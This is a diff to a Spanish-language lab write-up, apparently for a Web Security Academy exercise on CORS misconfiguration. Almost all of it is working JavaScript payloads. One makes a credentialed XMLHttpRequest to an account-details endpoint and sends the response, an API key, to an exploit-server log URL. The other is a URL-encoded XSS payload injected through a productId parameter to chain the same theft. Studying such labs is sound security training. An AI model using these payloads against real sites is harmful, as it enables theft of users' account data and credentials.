@@ -92,18 +92,20 @@ Algo super importante para considerar con este tipo de ataques que implementan l
 <script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://0a50000c0455b2a880c167e8007c00d2.web-security-academy.net/accountDetails',true);
+req.open('get','https://0a2800680416dbf0823c5ba001ef0005.web-security-academy.net/accountDetails',true);
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
-	location='//exploit-0a7100d304dbb20b80d56699012e0068.exploit-server.net/log?key='+this.responseText;
+	location='//exploit-0a2800680416dbf0823c5ba001ef0005.exploit-server.net/log?key='+this.responseText;
 };
 </script>
 //PAYLOAD FINAL: 
 //(Todo el script payload de ?productId=<script>...debe ser fielmente encoded to URL)
 <script>
-		document.location="http://stock.ID-LAB.web-security-academy.net/?productId=<script> var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ID-LAB.web-security-academy.net/accountDetails',true); req.withCredentials = true; req.send();  function reqListener() {  location='//ID-EXPLOIT.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=3";
+    document.location="http://stock.0a6800840430dbb282bd5cdc00210093.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a6800840430dbb282bd5cdc00210093.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a2800680416dbf0823c5ba001ef0005.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
 </script>
 
 ```
+
+
